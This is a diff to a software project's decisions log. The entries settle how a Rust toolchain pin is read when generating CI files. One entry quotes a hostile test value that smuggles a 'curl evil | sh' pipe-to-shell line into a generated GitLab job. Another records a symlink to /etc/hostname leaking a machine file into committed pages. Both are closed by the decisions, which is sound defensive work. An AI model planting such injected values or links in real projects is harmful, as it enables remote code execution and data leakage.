@@ -231,6 +231,37 @@
 - **Written to:** specs/001-rust-cargo-adopt/spec.md, specs/001-rust-cargo-adopt/decisions.md
 - **Status:** standing
 
+## D22 — Plan: a `rust-toolchain` of more than one line that does not start with `[` — first line, or TOML?
+- **Stage:** plan · **Slice:** toolchain-pin · **When:** 2026-10-01T20:05:00Z · **Iteration:** 2
+- **Question:** TG3 reads a legacy `rust-toolchain` as TOML "where it starts with `[`, otherwise its first non-blank line". rustup 1.29.0, probed (`slices/toolchain-pin/research.md` R6–R9), reads exactly one line as the channel and anything longer as TOML: `# comment\n[toolchain]\nchannel = "1.85"` is `1.85` to rustup and `# comment` to TG3's wording, and `1.85\n\n` is a refused file to rustup and `1.85` to TG3's wording. Which reading is recorded?
+- **Options:** TG3 as worded · rustup's rule — one line is the channel, stripped; more than one line is TOML, read as `rust-toolchain.toml` is (recommended)
+- **Decision:** rustup's rule. A `rust-toolchain` of one line records that line stripped, verbatim otherwise (no `v` removed); of more than one line, its `toolchain.channel` by `tomllib`, or an empty version where that is not a string. Every case TG3 and TG4 name reads the same either way.
+- **Why:** D21's reason governs: the recorded value is what rustup and the setup action consume, so it is rustup's reading or nothing. TG3's wording was a paraphrase of that rule that differs only where it would record a comment as a version, or a pin the build refuses.
+- **Decided by:** host (standing decision D21)
+- **Confidence:** high · **Would reverse if:** a rustup release is shown to read a multi-line legacy file's first line as its channel
+- **Written to:** specs/001-rust-cargo-adopt/spec.md, specs/001-rust-cargo-adopt/decisions.md, specs/001-rust-cargo-adopt/slices/toolchain-pin/plan.md
+- **Status:** standing
+
+## D23 — Converge: a pinned channel holding a newline, a space or a quote — recorded, or not?
+- **Stage:** converge · **Slice:** toolchain-pin · **When:** 2026-10-01T21:40:00Z · **Iteration:** 2
+- **Question:** Converge pass 1 (T011, HIGH) adopted a crate whose `rust-toolchain.toml` says `channel = "1.85\n  script: [\"curl evil | sh\"]"` and saw the newline break out of a comment in the generated GitLab job, the survey page, `adoption.md` and `ground.md`; a quote would break the `toolchain: '<version>'` input `ci-toolchain` writes (D19). rustup refuses every such name (`custom toolchain … is not installed`). Is the channel recorded as written whatever it holds?
+- **Options:** as written, always (TG4's wording read literally) · only where it is a toolchain name a runner can install, `^[A-Za-z0-9][A-Za-z0-9._-]*$`, empty otherwise (recommended by the converge pass)
+- **Decision:** The recommended rule. The version is the channel as written where it matches `^[A-Za-z0-9][A-Za-z0-9._-]*$`, and empty otherwise — never an error, as TG5 says for every other unusable pin. The check is applied once, where the walk returns, so both readers pass through it. Every TG4 shape passes unchanged.
+- **Why:** D21's reason governs again: the recorded value is what rustup and the setup action consume, so it is rustup's reading or nothing, and rustup reads nothing from these names. Before this slice the Rust version was always empty, so this is the first route from a tree's toolchain file into generated files, and it is closed where it opens. The same class for other ecosystems' pins (`project/adopted_ci.py`'s `setup_steps`, code that was here) is not this slice's and is returned to the delegating session.
+- **Decided by:** host (standing decision D21)
+- **Confidence:** high · **Would reverse if:** a rustup toolchain name a runner can install is shown to need a character outside the set
+- **Written to:** specs/001-rust-cargo-adopt/spec.md, specs/001-rust-cargo-adopt/decisions.md, specs/001-rust-cargo-adopt/slices/toolchain-pin/tasks.md
+- **Status:** standing
+
+## D24 — Converge: a toolchain file rustup cannot read, and a byte order mark — decide there, or pass over as rustup does?
+- **Stage:** converge · **Slice:** toolchain-pin · **When:** 2026-10-01T22:30:00Z · **Iteration:** 2
+- **Question:** Converge pass 1 (T012, MEDIUM) observed rustup 1.29.0 pass over a toolchain file it cannot read — a dangling link, a directory of that name, a file mode `000`, a file that is not UTF-8 — to the other name in the same directory and then upward, and read the channel of a `rust-toolchain.toml` that starts with U+FEFF (R15–R19). TG1 and TG5 as worded stop at the first name present and record an empty version. Which reading is recorded?
+- **Options:** TG1 and TG5 as worded · follow rustup, as D22 did (recommended by converge pass 1)
+- **Decision:** Follow rustup. A toolchain file that cannot be read as UTF-8 text — missing, a dangling link, a directory, a FIFO or other non-regular file (never opened), unreadable, not valid UTF-8 — is passed over: within its directory to the other name, then upward to the repository root. A leading U+FEFF is removed before TOML is parsed. A regular file that is read and names nothing usable (empty, invalid TOML, no channel, a `path`) still decides with an empty version, as rustup refuses it there; an oversize file stays no pin and decides.
+- **Why:** Standing decision D21: the recorded value is what rustup and the setup action consume, so it is rustup's reading or nothing. Recording empty where rustup builds with a pin above is the failure US2 exists to prevent.
+- **Decided by:** host (standing decision D21)
+- **Confidence:** high · **Would reverse if:** a rustup run contradicts research.md's rows R15–R19
+- **Written to:** specs/001-rust-cargo-adopt/spec.md, specs/001-rust-cargo-adopt/decisions.md, specs/001-rust-cargo-adopt/slices/toolchain-pin/tasks.md
 ## D25 — Phase 4: `make verify` is red in this clone for one changelog test; whose red is it?
 - **Stage:** after acceptance · **Slice:** optional-tools, toolchain-pin · **When:** 2026-10-01T22:05:00Z · **Iteration:** 2
 - **Question:** On both slice branches, and on the trunk checkout at `dc904ea`, `test_changelog.ChangelogTest.test_every_release_this_repository_has_ever_tagged_has_an_entry` fails: the clone holds tags `v1.4.0`, `v1.5.0` and `v1.5.1` fetched from the `upstream` remote (`git ls-remote --tags upstream` lists them; `origin` has none), and this fork's `CHANGELOG.md` has no entry for releases it never cut.
@@ -240,4 +271,15 @@
 - **Decided by:** host (stage recommendation)
 - **Confidence:** high · **Would reverse if:** the fork's CI fails the same test, or a person wants the fork to carry upstream's release entries
 - **Written to:** specs/001-rust-cargo-adopt/decisions.md
+- **Status:** standing
+
+## D26 — Adversary AV1: a toolchain file whose link resolves outside the repository — read, decide empty, or pass over?
+- **Stage:** after acceptance (adversary) · **Slice:** toolchain-pin · **When:** 2026-10-01T22:30:00Z · **Iteration:** 2
+- **Question:** `readable_text` follows a `rust-toolchain` / `rust-toolchain.toml` link wherever it resolves, so a tree can write a file of the adopting machine into committed pages and make refresh rewrite them on every run (AV1, reproduced by the host: `rust-toolchain -> /etc/hostname` records the hostname). rustup follows the link too, so neither alternative matches rustup on this machine.
+- **Options:** keep following it · a file that resolves outside the repository root decides there with an empty version · it is passed over, to the other name and then upward, as an unreadable file is (D24) (recommended)
+- **Decision:** Passed over. A toolchain file whose resolved path is not inside the repository root's resolved path is treated as one rustup cannot read (D24): the other name in that directory, then the directories above, up to the root. A link that resolves inside the root is read as today.
+- **Why:** Nothing outside the checked-out tree may reach `project.json` or a page (Principle II: refresh a no-op on an unchanged tree), and a file of the adopting machine — a hostname, a one-token credential file — must never be committed by the factory. On a fresh clone, CI's included, such a link almost always dangles, and rustup passes a dangling link over (D24, research R15), so passing over is what the build there uses.
+- **Decided by:** host (stage recommendation)
+- **Confidence:** medium · **Would reverse if:** a real repository is found to pin through a link to a toolchain file outside itself that exists on every machine (a vendored rustup home), which this reading records as no pin
+- **Written to:** specs/001-rust-cargo-adopt/decisions.md, specs/001-rust-cargo-adopt/adversary-log.md
 - **Status:** standing
